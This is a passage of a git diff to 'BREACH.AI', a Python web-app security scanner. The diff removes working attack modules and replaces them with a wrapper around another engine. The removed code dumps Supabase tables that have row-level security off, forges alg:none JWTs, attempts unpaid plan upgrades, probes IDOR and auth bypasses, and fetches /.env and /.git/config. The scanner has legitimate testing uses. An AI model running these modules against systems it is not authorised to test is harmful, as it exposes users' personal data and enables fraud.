@@ -7,43 +7,41 @@
 ██████╔╝██║  ██║███████╗██║  ██║╚██████╗██║  ██║    ██║  ██║██║
 ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝
 
-THE ONE ENGINE - V1 + V2 Unified
-
-Modes:
-    quick       - Fast SaaS attacks only (default)
-    deep        - Quick + full injection suite
-    chainbreaker - Full 7-phase kill chain with AI orchestration
+BREACH.AI - GOD LEVEL SECURITY SCANNER
+======================================
+ONE mode. DEEP. Does EVERYTHING. Finds REAL vulnerabilities.
 
 Usage:
     python breach.py https://target.com
     python breach.py https://target.com --cookie "session=xxx"
-    python breach.py https://target.com --cookie1 "u1=x" --cookie2 "u2=y"  # IDOR
-    python breach.py https://target.com --deep --output report.json
-    python breach.py https://target.com --chainbreaker --timeout 2  # V2 Kill Chain
+    python breach.py https://target.com --cookie1 "u1=x" --cookie2 "u2=y"  # IDOR testing
 """
 
-import asyncio, aiohttp, json, sys, os, re, time, base64, hashlib, hmac
+import asyncio
+import json
+import time
 from dataclasses import dataclass, field
-from typing import Optional, List, Dict, Any, Set, Tuple
-from urllib.parse import urlparse, urljoin
-from datetime import datetime
+from typing import Optional, List, Dict, Any, Set, Callable
 from enum import Enum
+from datetime import datetime
+
 from rich.console import Console
-from rich.panel import Panel
-from rich.table import Table
-from rich import box
 
 console = Console()
 
+
 class Severity(Enum):
+    """Vulnerability severity levels."""
     CRITICAL = 4
     HIGH = 3
     MEDIUM = 2
     LOW = 1
     INFO = 0
 
+
 @dataclass
 class Finding:
+    """A vulnerability finding."""
     severity: Severity
     category: str
     title: str
@@ -59,825 +57,270 @@ class Finding:
     fix_suggestion: str = ""
     chained_from: Optional[str] = None
 
-@dataclass
-class StackFingerprint:
-    framework: Optional[str] = None
-    auth_provider: Optional[str] = None
-    database: Optional[str] = None
-    payment_provider: Optional[str] = None
-    hosting: Optional[str] = None
-    supabase_url: Optional[str] = None
-    supabase_anon_key: Optional[str] = None
-    firebase_api_key: Optional[str] = None
-    stripe_pk: Optional[str] = None
-    uuids: Set[str] = field(default_factory=set)
-    numeric_ids: Set[str] = field(default_factory=set)
 
 @dataclass
 class ScanState:
+    """State of the scan."""
     target: str
-    fingerprint: Optional[StackFingerprint] = None
     findings: List[Finding] = field(default_factory=list)
     extracted_ids: Set[str] = field(default_factory=set)
-    valid_endpoints: List[str] = field(default_factory=list)
-    protected_endpoints: List[str] = field(default_factory=list)
-
-class BusinessImpact:
-    @staticmethod
-    def calculate(finding_type: str, details: Dict = None) -> Tuple[int, str]:
-        details = details or {}
-        if finding_type == "data_leak":
-            records = details.get('records', 1)
-            has_pii = details.get('has_pii', False)
-            if has_pii:
-                return records * 150 + 50000, f"{records} records × $150 (GDPR) + $50K"
-            return records * 50 + 10000, f"{records} records × $50 + $10K"
-        elif finding_type == "payment_bypass":
-            cost = details.get('plan_cost', 99) * details.get('estimated_abusers', 100) * 12
-            return cost, f"${details.get('plan_cost', 99)}/mo × 100 abusers × 12mo"
-        elif finding_type == "idor":
-            return details.get('records', 1) * 100 + 15000, "Records access + response"
-        elif finding_type == "multi_tenant":
-            return 250000, "Cross-company exposure"
-        elif finding_type == "rls_bypass":
-            return details.get('records', 100) * 150 + 50000, "Database exposed"
-        elif finding_type == "auth_bypass":
-            return 25000, "Unauthorized access"
-        return 5000, "Security incident"
-
-class Patterns:
-    UUID = re.compile(r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', re.I)
-    NUMERIC_ID = re.compile(r'(?:id|Id|ID)["\s:=]+(\d+)')
-    JWT = re.compile(r'eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+')
-    SUPABASE_URL = re.compile(r'https://[a-z0-9]+\.supabase\.co')
-    SUPABASE_KEY = re.compile(r'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+')
-    FIREBASE_KEY = re.compile(r'AIza[a-zA-Z0-9_-]{35}')
-    STRIPE_PK = re.compile(r'pk_(?:live|test)_[a-zA-Z0-9]+')
-    PII_KEYWORDS = ['email', 'phone', 'password', 'address', 'ssn', 'name', 'card', 'secret', 'token']
-    STACK = {
-        'next.js': [r'_next/static', r'__NEXT_DATA__', r'next-auth'],
-        'nextauth': [r'/api/auth/session', r'next-auth', r'__Secure-next-auth'],
-        'supabase': [r'supabase\.co', r'\.supabase\.'],
-        'firebase': [r'firebaseio\.com', r'firebase\.google'],
-        'stripe': [r'stripe\.com', r'pk_live_', r'pk_test_'],
-        'razorpay': [r'razorpay', r'rzp_'],
-        'vercel': [r'vercel', r'\.vercel\.app'],
-    }
-
-class Extractor:
-    @staticmethod
-    def extract_all(content: str, fp: StackFingerprint):
-        urls = Patterns.SUPABASE_URL.findall(content)
-        if urls: fp.supabase_url = urls[0]
-        keys = Patterns.SUPABASE_KEY.findall(content)
-        if keys: fp.supabase_anon_key = keys[0]
-        fb = Patterns.FIREBASE_KEY.findall(content)
-        if fb: fp.firebase_api_key = fb[0]
-        stripe = Patterns.STRIPE_PK.findall(content)
-        if stripe: fp.stripe_pk = stripe[0]
-        fp.uuids.update(Patterns.UUID.findall(content)[:50])
-        fp.numeric_ids.update(Patterns.NUMERIC_ID.findall(content)[:20])
-
-    @staticmethod
-    def detect_pii(data: Any) -> List[str]:
-        pii = []
-        def scan(obj):
-            if isinstance(obj, dict):
-                for k, v in obj.items():
-                    if any(kw in k.lower() for kw in Patterns.PII_KEYWORDS): pii.append(k)
-                    scan(v)
-            elif isinstance(obj, list):
-                for item in obj[:5]: scan(item)
-        scan(data)
-        return list(set(pii))
-
-class StackDetector:
-    @classmethod
-    async def detect(cls, session, base_url: str) -> StackFingerprint:
-        fp = StackFingerprint()
-        content = ""
-        for page in ['/', '/api/health', '/api/auth/session', '/api/auth/providers']:
-            try:
-                async with session.get(urljoin(base_url, page), ssl=False, timeout=10) as resp:
-                    content += await resp.text() + str(resp.headers)
-            except: pass
-        cl = content.lower()
-        for name, patterns in Patterns.STACK.items():
-            if any(re.search(p, cl) for p in patterns):
-                if name == 'next.js': fp.framework = name
-                elif name == 'nextauth': fp.auth_provider = name
-                elif name in ['supabase', 'firebase']: fp.database = name; fp.auth_provider = fp.auth_provider or name
-                elif name in ['stripe', 'razorpay']: fp.payment_provider = name
-                elif name == 'vercel': fp.hosting = name
-        Extractor.extract_all(content, fp)
-        return fp
-
-class AttackModule:
-    def __init__(self, session, state: ScanState):
-        self.session = session
-        self.state = state
-        self.findings: List[Finding] = []
-    async def run(self, cookies: Dict = None, cookies2: Dict = None) -> List[Finding]:
-        raise NotImplementedError
-    def add_finding(self, **kw):
-        f = Finding(**kw)
-        self.findings.append(f)
-        self.state.findings.append(f)
-        return f
-
-class SupabaseRLSAttack(AttackModule):
-    TABLES = ['users', 'profiles', 'accounts', 'projects', 'documents', 'orders', 'payments', 'teams', 'messages', 'settings']
-    async def run(self, cookies=None, cookies2=None):
-        fp = self.state.fingerprint
-        if not fp.supabase_url or not fp.supabase_anon_key: return []
-        console.print(f"\n[yellow]⚡ SUPABASE RLS ATTACK[/yellow]")
-        headers = {'apikey': fp.supabase_anon_key, 'Authorization': f'Bearer {fp.supabase_anon_key}'}
-        total, vuln_tables = 0, []
-        for table in self.TABLES:
-            url = f"{fp.supabase_url}/rest/v1/{table}?select=*&limit=100"
-            try:
-                async with self.session.get(url, headers=headers, ssl=False, timeout=10) as resp:
-                    if resp.status == 200:
-                        data = json.loads(await resp.text())
-                        if isinstance(data, list) and data:
-                            cnt = len(data)
-                            total += cnt
-                            pii = Extractor.detect_pii(data[0])
-                            vuln_tables.append({'table': table, 'records': cnt, 'pii': pii})
-                            for r in data[:10]:
-                                if isinstance(r, dict):
-                                    for k, v in r.items():
-                                        if 'id' in k.lower() and v: self.state.extracted_ids.add(str(v))
-                            console.print(f"[red]  🔴 {table}[/red] → {cnt} records" + (f" [PII: {', '.join(pii[:3])}]" if pii else ""))
-            except: pass
-        if vuln_tables:
-            impact, exp = BusinessImpact.calculate('rls_bypass', {'records': total, 'has_pii': any(t['pii'] for t in vuln_tables)})
-            self.add_finding(severity=Severity.CRITICAL, category="supabase_rls", title=f"Supabase RLS Bypass - {total} Records",
-                description=f"RLS disabled. {len(vuln_tables)} tables accessible.", endpoint=fp.supabase_url, method="GET",
-                evidence={'tables': vuln_tables}, records_exposed=total, pii_fields=list(set(p for t in vuln_tables for p in t['pii'])),
-                business_impact=impact, impact_explanation=exp, curl_command=f"curl '{fp.supabase_url}/rest/v1/users?select=*' -H 'apikey: ...'",
-                fix_suggestion="ALTER TABLE x ENABLE ROW LEVEL SECURITY;")
-        return self.findings
-
-class AuthBypassAttack(AttackModule):
-    ENDPOINTS = ['/api/projects', '/api/users', '/api/payments', '/api/orders', '/api/admin', '/api/documents', '/api/teams']
-    async def run(self, cookies=None, cookies2=None):
-        console.print(f"\n[yellow]⚡ AUTH BYPASS ATTACK[/yellow]")
-        for endpoint in self.ENDPOINTS:
-            base_url = urljoin(self.state.target, endpoint)
-            try:
-                async with self.session.get(base_url, ssl=False, timeout=10) as resp:
-                    if resp.status != 401: continue
-            except: continue
-            test_ids = ['1', 'test', 'admin'] + list(self.state.extracted_ids)[:5] + list(self.state.fingerprint.uuids)[:5]
-            for tid in test_ids:
-                id_url = f"{base_url}/{tid}"
-                try:
-                    async with self.session.get(id_url, ssl=False, timeout=10) as resp:
-                        if resp.status == 404:
-                            console.print(f"[red]  🔴 AUTH BYPASS: {endpoint}/{{id}}[/red]")
-                            self.add_finding(severity=Severity.HIGH, category="auth_bypass", title=f"Auth Bypass - {endpoint}/{{id}}",
-                                description=f"{endpoint}→401, {endpoint}/{{id}}→404", endpoint=f"{endpoint}/{{id}}", method="GET",
-                                business_impact=25000, impact_explanation="Middleware gap", curl_command=f"curl '{id_url}'",
-                                fix_suggestion="Apply auth to all routes")
-                            break
-                        elif resp.status == 200:
-                            body = await resp.text()
-                            if len(body) > 100 and '<html' not in body.lower()[:100]:
-                                console.print(f"[red bold]  🔴 UNAUTH DATA: {endpoint}/{tid}[/red bold]")
-                                self.add_finding(severity=Severity.CRITICAL, category="auth_bypass", title=f"Unauth Access - {endpoint}",
-                                    description="Data without auth", endpoint=f"{endpoint}/{tid}", method="GET", business_impact=50000,
-                                    impact_explanation="Full auth bypass", curl_command=f"curl '{id_url}'")
-                                break
-                except: pass
-        return self.findings
-
-class PaymentBypassAttack(AttackModule):
-    ENDPOINTS = ['/api/user/subscription', '/api/subscription', '/api/billing/plan', '/api/upgrade']
-    PAYLOADS = [{"subscriptionPlan": "PRO"}, {"subscriptionPlan": "PREMIUM"}, {"plan": "pro"}]
-    async def run(self, cookies=None, cookies2=None):
-        if not cookies: return []
-        console.print(f"\n[yellow]⚡ PAYMENT BYPASS ATTACK[/yellow]")
-        for endpoint in self.ENDPOINTS:
-            url = urljoin(self.state.target, endpoint)
-            for payload in self.PAYLOADS:
-                try:
-                    async with self.session.post(url, cookies=cookies, json=payload, ssl=False, timeout=10) as resp:
-                        if resp.status == 200:
-                            body = await resp.text()
-                            if any(p in body.lower() for p in ['pro', 'premium', 'enterprise', 'upgraded']):
-                                console.print(f"[red bold]  🔴 PAYMENT BYPASS: {endpoint}[/red bold]")
-                                impact, exp = BusinessImpact.calculate('payment_bypass', {'plan_cost': 99})
-                                self.add_finding(severity=Severity.CRITICAL, category="payment_bypass", title="Payment Bypass",
-                                    description=f"Upgrade without payment via {endpoint}", endpoint=endpoint, method="POST",
-                                    evidence={'payload': payload}, business_impact=impact, impact_explanation=exp,
-                                    curl_command=f"curl -X POST '{url}' -d '{json.dumps(payload)}'",
-                                    fix_suggestion="Verify payment via webhook")
-                                return self.findings
-                except: pass
-        return self.findings
-
-class IDORAttack(AttackModule):
-    ENDPOINTS = ['/api/projects/{id}', '/api/users/{id}', '/api/orders/{id}', '/api/documents/{id}', '/api/files/{id}']
-    async def run(self, cookies=None, cookies2=None):
-        console.print(f"\n[yellow]⚡ IDOR ATTACK (Chained)[/yellow]")
-        test_ids = list(self.state.extracted_ids)[:15] + list(self.state.fingerprint.uuids)[:10]
-        if not test_ids:
-            console.print(f"[dim]  No IDs for IDOR[/dim]")
-            return []
-        console.print(f"[dim]  Testing {len(test_ids)} IDs[/dim]")
-        for tmpl in self.ENDPOINTS:
-            for tid in test_ids[:10]:
-                endpoint = tmpl.replace('{id}', str(tid))
-                url = urljoin(self.state.target, endpoint)
-                try:
-                    async with self.session.get(url, cookies=cookies, ssl=False, timeout=10) as resp:
-                        if resp.status == 200:
-                            body = await resp.text()
-                            if len(body) > 100 and '<html' not in body.lower()[:100]:
-                                try:
-                                    data = json.loads(body)
-                                    pii = Extractor.detect_pii(data)
-                                except: pii = []
-                                console.print(f"[red]  🔴 IDOR: {endpoint}[/red]" + (f" [PII]" if pii else ""))
-                                impact, exp = BusinessImpact.calculate('idor', {'records': 1, 'has_pii': bool(pii)})
-                                self.add_finding(severity=Severity.CRITICAL if pii else Severity.HIGH, category="idor",
-                                    title="IDOR via Extracted ID", description=f"Accessed {tmpl} with chained ID",
-                                    endpoint=endpoint, method="GET", pii_fields=pii, business_impact=impact,
-                                    impact_explanation=exp, curl_command=f"curl '{url}'", chained_from="Public endpoint")
-                except: pass
-        return self.findings
-
-class TwoUserIDORAttack(AttackModule):
-    async def run(self, cookies=None, cookies2=None):
-        if not cookies or not cookies2: return []
-        console.print(f"\n[yellow]⚡ TWO-USER IDOR ATTACK[/yellow]")
-        u1_ids = set()
-        for ep in ['/api/projects', '/api/orders', '/api/documents']:
-            try:
-                async with self.session.get(urljoin(self.state.target, ep), cookies=cookies, ssl=False, timeout=10) as resp:
-                    if resp.status == 200:
-                        u1_ids.update(Patterns.UUID.findall(await resp.text())[:10])
-            except: pass
-        if not u1_ids:
-            console.print(f"[dim]  No User1 IDs[/dim]")
-            return []
-        console.print(f"[dim]  Got {len(u1_ids)} User1 IDs[/dim]")
-        for tmpl in ['/api/projects/{id}', '/api/orders/{id}', '/api/documents/{id}']:
-            for tid in list(u1_ids)[:5]:
-                endpoint = tmpl.replace('{id}', tid)
-                url = urljoin(self.state.target, endpoint)
-                try:
-                    async with self.session.get(url, cookies=cookies2, ssl=False, timeout=10) as resp:
-                        if resp.status == 200:
-                            body = await resp.text()
-                            if len(body) > 100 and '<html' not in body.lower()[:100]:
-                                console.print(f"[red bold]  🔴 CROSS-USER IDOR: {endpoint}[/red bold]")
-                                self.add_finding(severity=Severity.CRITICAL, category="idor_cross_user",
-                                    title="Cross-User IDOR", description="User2 accessed User1 data",
-                                    endpoint=endpoint, method="GET", business_impact=50000,
-                                    impact_explanation="Cross-user data access", curl_command=f"curl '{url}'",
-                                    fix_suggestion="Check resource.userId === currentUser.id")
-                except: pass
-        return self.findings
-
-class LogInjectionAttack(AttackModule):
-    async def run(self, cookies=None, cookies2=None):
-        console.print(f"\n[yellow]⚡ LOG INJECTION ATTACK[/yellow]")
-        for ep in ['/api/auth/_log', '/api/log', '/api/logs']:
-            url = urljoin(self.state.target, ep)
-            try:
-                async with self.session.post(url, json={"msg": "test"}, ssl=False, timeout=10) as resp:
-                    if resp.status == 200:
-                        console.print(f"[yellow]  🟡 LOG INJECTION: {ep}[/yellow]")
-                        self.add_finding(severity=Severity.MEDIUM, category="log_injection", title=f"Log Injection - {ep}",
-                            description="Accepts arbitrary log data", endpoint=ep, method="POST", business_impact=10000,
-                            impact_explanation="Log poisoning", curl_command=f"curl -X POST '{url}' -d '{{\"x\":1}}'",
-                            fix_suggestion="Validate input")
-                        return self.findings
-            except: pass
-        return self.findings
-
-class InfoDisclosureAttack(AttackModule):
-    async def run(self, cookies=None, cookies2=None):
-        console.print(f"\n[yellow]⚡ INFO DISCLOSURE ATTACK[/yellow]")
-        sensitive = ['database', 'password', 'secret', 'key', 'memory', 'uptime', 'env']
-        for ep in ['/api/health', '/api/status', '/api/config', '/.env', '/.git/config']:
-            url = urljoin(self.state.target, ep)
-            try:
-                async with self.session.get(url, ssl=False, timeout=10) as resp:
-                    if resp.status == 200:
-                        body = await resp.text()
-                        if ep in ['/.env', '/.git/config'] and len(body) > 10 and '<html' not in body.lower()[:100]:
-                            console.print(f"[red bold]  🔴 SENSITIVE FILE: {ep}[/red bold]")
-                            self.add_finding(severity=Severity.CRITICAL, category="info_disclosure", title=f"Exposed: {ep}",
-                                description="Config file accessible", endpoint=ep, method="GET", business_impact=50000,
-                                impact_explanation="Secrets exposed", curl_command=f"curl '{url}'")
-                        else:
-                            try:
-                                data = json.loads(body)
-                                found = [k for k in str(data).lower().split() if any(s in k for s in sensitive)][:5]
-                                if found:
-                                    console.print(f"[yellow]  🟡 INFO LEAK: {ep}[/yellow]")
-                                    self.add_finding(severity=Severity.MEDIUM, category="info_disclosure",
-                                        title=f"Info Disclosure - {ep}", description=f"Exposes system info",
-                                        endpoint=ep, method="GET", evidence=data, business_impact=5000,
-                                        impact_explanation="System info aids attacks", curl_command=f"curl '{url}'")
-                            except: pass
-            except: pass
-        return self.findings
-
-class GraphQLAttack(AttackModule):
-    async def run(self, cookies=None, cookies2=None):
-        console.print(f"\n[yellow]⚡ GRAPHQL ATTACK[/yellow]")
-        gql_url = None
-        for ep in ['/graphql', '/api/graphql']:
-            url = urljoin(self.state.target, ep)
-            try:
-                async with self.session.post(url, json={"query": "{__typename}"}, ssl=False, timeout=10) as resp:
-                    if resp.status == 200 and 'data' in await resp.text():
-                        gql_url = url
-                        console.print(f"[green]  ✓ GraphQL at {ep}[/green]")
-                        break
-            except: pass
-        if not gql_url: return []
-        try:
-            async with self.session.post(gql_url, json={"query": "{ __schema { types { name fields { name } } } }"}, cookies=cookies, ssl=False, timeout=15) as resp:
-                if resp.status == 200:
-                    data = json.loads(await resp.text())
-                    if '__schema' in str(data):
-                        types = [t for t in data.get('data', {}).get('__schema', {}).get('types', []) if t.get('name') and not t['name'].startswith('__')]
-                        console.print(f"[red]  🔴 INTROSPECTION ON[/red] - {len(types)} types")
-                        self.add_finding(severity=Severity.HIGH, category="graphql", title="GraphQL Introspection",
-                            description=f"{len(types)} types exposed", endpoint=gql_url, method="POST",
-                            evidence={'types': [t['name'] for t in types[:10]]}, business_impact=15000,
-                            impact_explanation="Schema exposed", fix_suggestion="Disable introspection")
-        except: pass
-        return self.findings
-
-class JWTAttack(AttackModule):
-    async def run(self, cookies=None, cookies2=None):
-        console.print(f"\n[yellow]⚡ JWT ATTACK[/yellow]")
-        tokens = [(k, v) for k, v in (cookies or {}).items() if Patterns.JWT.match(str(v))]
-        if self.state.fingerprint.supabase_anon_key:
-            tokens.append(('supabase', self.state.fingerprint.supabase_anon_key))
-        if not tokens:
-            console.print(f"[dim]  No JWTs[/dim]")
-            return []
-        for name, token in tokens:
-            try:
-                parts = token.split('.')
-                header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
-                payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
-                console.print(f"[dim]  Testing {name}: alg={header.get('alg')}[/dim]")
-                # None alg test
-                h2 = header.copy(); h2['alg'] = 'none'
-                none_tok = f"{base64.urlsafe_b64encode(json.dumps(h2).encode()).decode().rstrip('=')}.{base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')}."
-                tc = (cookies or {}).copy(); tc[name] = none_tok
-                for ep in ['/api/user', '/api/me']:
-                    try:
-                        async with self.session.get(urljoin(self.state.target, ep), cookies=tc, ssl=False, timeout=10) as resp:
-                            if resp.status == 200:
-                                body = await resp.text()
-                                if len(body) > 50 and 'error' not in body.lower():
-                                    console.print(f"[red bold]  🔴 JWT NONE ALG![/red bold]")
-                                    self.add_finding(severity=Severity.CRITICAL, category="jwt", title="JWT None Alg",
-                                        description="Accepts alg:none", endpoint=ep, method="GET", business_impact=100000,
-                                        impact_explanation="Full auth bypass", fix_suggestion="Verify algorithm explicitly")
-                                    return self.findings
-                    except: pass
-            except: pass
-        return self.findings
-
-class ScanMode(Enum):
-    QUICK = "quick"           # V1 SaaS attacks only
-    DEEP = "deep"             # V1 + full injection suite
-    CHAINBREAKER = "chainbreaker"  # V2 7-phase kill chain
+    pages_crawled: int = 0
+    endpoints_found: int = 0
+    duration_seconds: int = 0
 
 
 class BreachEngine:
     """
-    THE UNIFIED ENGINE - V1 + V2 Combined
+    BREACH.AI - GOD LEVEL Deep Scanner
 
-    Modes:
-        quick       - Fast SaaS attacks (Supabase RLS, auth bypass, IDOR, etc.)
-        deep        - Quick + full injection suite (SQLi, XSS, SSRF, etc.)
-        chainbreaker - Full 7-phase AI-driven kill chain
+    Single mode: DEEP
+    - Crawls entire website (500+ pages)
+    - Tests all injection types (SQLi, XSS, SSRF, CMDi, LFI, etc.)
+    - Tests authentication bypass
+    - Tests IDOR vulnerabilities
+    - Finds sensitive file exposure
 
-    Features:
-        - Learning Engine integration (gets smarter with every scan)
-        - Integration hooks (Slack, Jira, webhooks)
-        - Attack prioritization based on tech stack
+    Target duration: 15-20 minutes
     """
 
-    def __init__(self, mode: str = "quick", deep_mode: bool = False, timeout_hours: int = 1):
-        # Handle legacy deep_mode parameter
-        if deep_mode and mode == "quick":
-            mode = "deep"
+    def __init__(self, mode: str = "deep", timeout_hours: int = 1, deep_mode: bool = True):
+        """
+        Initialize the engine.
 
-        self.mode = ScanMode(mode) if isinstance(mode, str) else mode
-        self.deep_mode = self.mode in [ScanMode.DEEP, ScanMode.CHAINBREAKER]
-        self.chainbreaker_mode = self.mode == ScanMode.CHAINBREAKER
-        self.timeout_hours = timeout_hours
-        self.session = None
-        self.state = None
-        self.start_time = 0
+        Args:
+            mode: Always "deep" - ignored for backwards compatibility
+            timeout_hours: Maximum scan duration
+            deep_mode: Always True - ignored for backwards compatibility
+        """
+        self.timeout_minutes = timeout_hours * 60
+        self.state: Optional[ScanState] = None
+        self._on_finding_callbacks: List[Callable] = []
+        self._on_complete_callbacks: List[Callable] = []
+        self._on_progress_callbacks: List[Callable] = []
+        self._deep_engine = None
+        self._result = None
 
-        # Learning engine integration
-        self._learning_engine = None
-        self._detected_tech = []
-        self._detected_waf = ""
-
-        # Integration callbacks
-        self._on_finding_callbacks = []
-        self._on_complete_callbacks = []
-
-    def _init_learning_engine(self):
-        """Initialize the learning engine (lazy loading)."""
-        if self._learning_engine is None:
-            try:
-                from backend.breach.core.learning_engine import get_learning_engine
-                self._learning_engine = get_learning_engine()
-                console.print(f"[dim]🧠 Learning Engine: {self._learning_engine.data.total_attacks} past attacks loaded[/dim]")
-            except Exception as e:
-                console.print(f"[dim]Learning engine not available: {e}[/dim]")
-        return self._learning_engine
-
-    def on_finding(self, callback):
-        """Register callback for when a finding is discovered."""
+    def on_finding(self, callback: Callable):
+        """Register callback for when findings are discovered."""
         self._on_finding_callbacks.append(callback)
 
-    def on_complete(self, callback):
+    def on_complete(self, callback: Callable):
         """Register callback for when scan completes."""
         self._on_complete_callbacks.append(callback)
 
-    async def _fire_finding(self, finding):
-        """Fire finding callbacks."""
-        for cb in self._on_finding_callbacks:
-            try:
-                if asyncio.iscoroutinefunction(cb):
-                    await cb(finding)
-                else:
-                    cb(finding)
-            except Exception as e:
-                console.print(f"[dim]Callback error: {e}[/dim]")
-
-    async def _fire_complete(self, state):
-        """Fire completion callbacks."""
-        for cb in self._on_complete_callbacks:
-            try:
-                if asyncio.iscoroutinefunction(cb):
-                    await cb(state)
-                else:
-                    cb(state)
-            except Exception as e:
-                console.print(f"[dim]Callback error: {e}[/dim]")
+    def on_progress(self, callback: Callable):
+        """Register callback for progress updates. Callback receives (percent, phase_message)."""
+        self._on_progress_callbacks.append(callback)
 
     async def __aenter__(self):
-        self.session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30), headers={'User-Agent': 'BREACH.AI/4.0'})
+        from .deep_scan import DeepScanEngine
+        self._deep_engine = DeepScanEngine(
+            timeout_minutes=self.timeout_minutes,
+            max_pages=500,
+            concurrent_requests=20
+        )
+        await self._deep_engine.__aenter__()
         return self
 
     async def __aexit__(self, *args):
-        if self.session: await self.session.close()
-        # Save learning data
-        if self._learning_engine:
-            self._learning_engine.save()
+        if self._deep_engine:
+            await self._deep_engine.__aexit__(*args)
 
-    async def breach(self, target, cookie=None, cookie2=None, token=None, scope=None):
+    async def breach(
+        self,
+        target: str,
+        cookie: str = None,
+        cookie2: str = None,
+        token: str = None,
+        scope: List[str] = None,
+    ) -> ScanState:
         """
-        Run the breach assessment.
+        Run the GOD LEVEL deep scan.
 
         Args:
             target: Target URL
-            cookie: Session cookie for user 1
-            cookie2: Session cookie for user 2 (for IDOR testing)
-            token: Bearer token (alternative auth)
-            scope: List of in-scope domains (for chainbreaker mode)
+            cookie: Session cookie string for authenticated testing
+            cookie2: Second user's cookie string for IDOR testing
+            token: Bearer token (alternative to cookie)
+            scope: Ignored - for backwards compatibility
+
+        Returns:
+            ScanState with all findings
         """
-        self.start_time = time.time()
-        if not target.startswith('http'): target = f'https://{target}'
+        if not target.startswith('http'):
+            target = f'https://{target}'
+
+        # Initialize state
         self.state = ScanState(target=target)
-        cookies = self._parse(cookie)
-        cookies2 = self._parse(cookie2)
-        self._banner(target, bool(cookies), bool(cookies2))
 
-        # Initialize learning engine
-        learning = self._init_learning_engine()
+        # Parse cookies
+        cookies = self._parse_cookies(cookie)
+        cookies2 = self._parse_cookies(cookie2)
 
-        # ========== CHAINBREAKER MODE (V2 Kill Chain) ==========
-        if self.chainbreaker_mode:
-            console.print(f"\n[bold magenta]═══════════════════════════════════════════════════════════════════════[/bold magenta]")
-            console.print(f"[bold magenta]  CHAINBREAKER MODE - 7-Phase Kill Chain with AI Orchestration[/bold magenta]")
-            console.print(f"[bold magenta]═══════════════════════════════════════════════════════════════════════[/bold magenta]")
+        # Register finding callback
+        async def on_deep_finding(deep_finding):
+            # Convert to old Finding format
+            finding = self._convert_finding(deep_finding)
+            self.state.findings.append(finding)
 
+            # Fire callbacks
+            for cb in self._on_finding_callbacks:
+                try:
+                    if asyncio.iscoroutinefunction(cb):
+                        await cb(finding)
+                    else:
+                        cb(finding)
+                except:
+                    pass
+
+        self._deep_engine.on_finding(on_deep_finding)
+
+        # Progress callback to fire registered callbacks
+        def on_progress(percent, message):
+            for cb in self._on_progress_callbacks:
+                try:
+                    cb(percent, message)
+                except:
+                    pass
+
+        # Run the deep scan
+        start_time = time.time()
+
+        result = await self._deep_engine.scan(
+            target=target,
+            cookies=cookies,
+            cookies2=cookies2,
+            token=token,
+            progress_callback=on_progress,
+        )
+
+        self._result = result
+
+        # Update state
+        self.state.pages_crawled = result.pages_crawled
+        self.state.endpoints_found = result.endpoints_found
+        self.state.extracted_ids = set()  # IDs are tracked in deep engine
+        self.state.duration_seconds = result.duration_seconds
+
+        # Fire complete callbacks
+        for cb in self._on_complete_callbacks:
             try:
-                from backend.breach.core.orchestrator import KillChainOrchestrator
+                if asyncio.iscoroutinefunction(cb):
+                    await cb(self.state)
+                else:
+                    cb(self.state)
+            except:
+                pass
 
-                # Create orchestrator with our HTTP session
-                orchestrator = KillChainOrchestrator(http_client=self.session)
-
-                # Run the full kill chain
-                breach_session = await orchestrator.run_breach(
-                    target=target,
-                    timeout_hours=self.timeout_hours,
-                    scope=scope or [target],
-                    rules={
-                        "cookies": cookies,
-                        "cookies2": cookies2,
-                        "token": token,
-                    }
-                )
-
-                # Convert V2 findings to V1 format for compatibility
-                self._convert_v2_findings(breach_session)
-
-                # Learn from the V2 session
-                if learning and breach_session:
-                    self._learn_from_v2_session(learning, breach_session)
-
-                console.print(f"\n[bold green]Kill Chain Complete![/bold green]")
-                console.print(f"  Access Level: {breach_session.highest_access.value}")
-                console.print(f"  Evidence Items: {len(breach_session.evidence_collected)}")
-                console.print(f"  Systems Compromised: {len(breach_session.systems_compromised)}")
-
-            except Exception as e:
-                console.print(f"[red]Kill Chain failed: {e}[/red]")
-                import traceback
-                traceback.print_exc()
-                # Fall back to standard mode
-                console.print(f"\n[yellow]Falling back to standard deep mode...[/yellow]")
-                await self._run_standard_scan(cookies, cookies2, learning)
-        else:
-            # ========== STANDARD MODE (V1) ==========
-            await self._run_standard_scan(cookies, cookies2, learning)
-
-        # Fire completion callbacks
-        await self._fire_complete(self.state)
-
-        self._report()
         return self.state
 
-    async def _run_standard_scan(self, cookies, cookies2, learning):
-        """Run standard V1 scan flow."""
-        console.print(f"\n[bold cyan]▶ PHASE 1: FINGERPRINT[/bold cyan]")
-        self.state.fingerprint = await StackDetector.detect(self.session, self.state.target)
-        self._show_fp()
+    def _parse_cookies(self, cookie_str: str) -> Dict[str, str]:
+        """Parse cookie string to dict."""
+        if not cookie_str:
+            return {}
 
-        # Extract detected technologies for learning
-        self._detected_tech = self._extract_tech_list()
-
-        # Get attack prioritization from learning engine
-        attack_order = None
-        if learning and self._detected_tech:
-            try:
-                predictions = learning.predict_vulnerabilities(self._detected_tech)
-                if predictions:
-                    console.print(f"[dim]🧠 Predicted vulns: {', '.join(p['vulnerability'] for p in predictions[:3])}[/dim]")
-            except Exception as e:
-                console.print(f"[dim]Prediction failed: {e}[/dim]")
-
-        console.print(f"\n[bold cyan]▶ PHASE 2: RECON[/bold cyan]")
-        await self._recon(cookies)
-
-        console.print(f"\n[bold cyan]▶ PHASE 3: SAAS ATTACKS[/bold cyan]")
-        attack_modules = [SupabaseRLSAttack, AuthBypassAttack, PaymentBypassAttack, IDORAttack, TwoUserIDORAttack, LogInjectionAttack, InfoDisclosureAttack, GraphQLAttack, JWTAttack]
-
-        for Mod in attack_modules:
-            try:
-                module = Mod(self.session, self.state)
-                findings_before = len(self.state.findings)
-                await module.run(cookies, cookies2)
